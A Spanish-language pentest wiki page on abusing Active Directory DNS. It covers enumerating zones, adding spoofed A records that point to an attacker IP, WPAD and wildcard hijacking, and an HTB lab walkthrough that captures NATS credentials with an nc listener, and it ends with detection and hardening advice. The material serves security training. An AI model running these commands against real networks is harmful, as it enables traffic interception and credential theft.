# Registros DNS de AD

{{#include ../../banners/hacktricks-training.md}}

De forma predeterminada, **cualquier usuario** de Active Directory puede **enumerar todos los registros DNS** de las zonas DNS del dominio o del bosque, de forma similar a una transferencia de zona (los usuarios pueden listar los objetos secundarios de una zona DNS en un entorno AD).

La herramienta [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) permite **enumerar** y **exportar** **todos los registros DNS** de la zona con fines de recon de redes internas.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (abril de 2025) añade salida JSON/Greppable (`--json`), resolución DNS multihilo y compatibilidad con TLS 1.2/1.3 al conectarse a LDAPS  

Para más información, consulta [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Crear / Modificar registros (ADIDNS spoofing)

Como el grupo **Authenticated Users** tiene **Create Child** en la DACL de la zona de forma predeterminada, cualquier cuenta de dominio (o cuenta de equipo) puede registrar registros adicionales. Esto se puede usar para secuestrar tráfico, forzar NTLM relay o incluso comprometer todo el dominio.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py se incluye con Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Primitivas de ataque comunes

1. **Registro comodín** – `*.<zone>` convierte el servidor DNS de AD en un responder para toda la empresa, similar al spoofing de LLMNR/NBNS. Se puede abusar para capturar hashes NTLM o retransmitirlos a LDAP/SMB. (Requiere que WINS-lookup esté deshabilitado.)<sup>[[1]](#references)</sup>    
2. **Secuestro de WPAD** – agrega `wpad` (o un registro **NS** que apunte a un host del atacante para eludir la Global-Query-Block-List) y actúa como proxy transparente de las solicitudes HTTP salientes para recolectar credenciales. Microsoft corrigió los bypasses de wildcard/DNAME (CVE-2018-8320), pero los **registros NS siguen funcionando**.<sup>[[1]](#references)</sup>    
3. **Toma de control de una entrada obsoleta** – reclama la dirección IP que pertenecía anteriormente a una estación de trabajo y la entrada DNS asociada seguirá resolviendo, lo que permite ataques de resource-based constrained delegation o Shadow-Credentials sin tocar DNS.    
4. **Suplantación de DHCP → DNS** – en una implementación predeterminada de Windows DHCP+DNS, un atacante no autenticado en la misma subred puede sobrescribir cualquier registro A existente (incluidos los de Domain Controllers) mediante solicitudes DHCP falsificadas que activan actualizaciones dinámicas de DNS (Akamai “DDSpoof”, 2023). Esto permite un ataque machine-in-the-middle contra Kerberos/LDAP y puede llevar a la toma de control total del dominio.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – cambia el `dNSHostName` de una cuenta de equipo que controlas, registra un registro A coincidente y luego solicita un certificado para ese nombre para suplantar al DC. Herramientas como **Certipy** o **BloodyAD** automatizan todo el proceso.  

Un registro DNS de AD con [información de destino serializada](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) puede formar parte de una cadena de relay condicional: quien realiza la solicitud necesita permisos para crear registros, una vía de coerción que haga que el equipo de destino se autentique con ese nombre y un destino de relay que acepte la autenticación resultante. Evalúa por separado el protocolo de destino; la firma SMB en la conexión entrante no determina por sí sola si un destino HTTPS WinRM acepta el relay. El nivel de parche, el tratamiento de nombres, Extended Protection y la configuración del servicio pueden cambiar el resultado.

---

### Secuestro de servicios internos mediante registros dinámicos obsoletos (caso práctico de NATS)

Cuando las actualizaciones dinámicas están habilitadas para todos los usuarios autenticados, **se puede volver a reclamar un nombre de servicio dado de baja y apuntarlo a infraestructura del atacante**. El DC Mirage de HTB expuso el hostname `nats-svc.mirage.htb` tras el scavenging de DNS, por lo que cualquier usuario con pocos privilegios podía:<sup>[[3]](#references)</sup>

1. **Confirmar que falta el registro** y averiguar el SOA con `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Vuelve a crear el registro** hacia una interfaz externa/VPN que esté bajo su control:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Suplanta el servicio en texto plano**. Los clientes NATS esperan recibir un banner `INFO { ... }` antes de enviar las credenciales, así que basta con copiar un banner legítimo del broker real para obtener secretos:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Cualquier cliente que resuelva el nombre secuestrado filtrará inmediatamente su frame JSON `CONNECT` (incluidos `"user"`/`"pass"`) al listener. Ejecutar el binario oficial `nats-server -V` en el host del atacante, desactivar la redacción de logs o simplemente capturar la sesión con Wireshark produce las mismas credenciales en texto plano, porque TLS era opcional.

4. **Pivotar con las credenciales capturadas**: en Mirage, la cuenta NATS robada proporcionó acceso a JetStream, que expuso eventos históricos de autenticación con nombres de usuario y contraseñas de AD reutilizables.

Este patrón se aplica a todos los servicios integrados con AD que dependen de handshakes TCP no seguros (API HTTP, RPC, MQTT, etc.): una vez secuestrado el registro DNS, el atacante se convierte en el servicio.

---

## Detección y hardening

* Deniega a **Authenticated Users** el derecho *Create all child objects* en zonas sensibles y delega las actualizaciones dinámicas a una cuenta dedicada utilizada por DHCP.
* Si se requieren actualizaciones dinámicas, configura la zona como **Secure-only** y habilita **Name Protection** en DHCP para que solo el objeto de equipo propietario pueda sobrescribir su propio registro.
* Supervisa los ID de evento 257/252 (actualización dinámica) y 770 (transferencia de zona) del servidor DNS, así como las escrituras LDAP en `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Bloquea los nombres peligrosos (`wpad`, `isatap`, `*`) con un registro intencionalmente benigno o mediante la Global Query Block List.
* Mantén los servidores DNS actualizados; por ejemplo, los errores de RCE CVE-2024-26224 y CVE-2024-26231 alcanzaron **CVSS 9.8** y se pueden explotar de forma remota contra Domain Controllers.  

## References

- [1] [ADIDNS revisitado: WPAD, GQBL y más](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [Suplantación de registros DNS mediante el abuso de las actualizaciones dinámicas DNS de DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: encadenamiento de filtraciones NFS, abuso de DNS dinámico, robo de credenciales NATS, secretos de JetStream y Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Entrar en la zona: volcado del DNS de Active Directory con adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
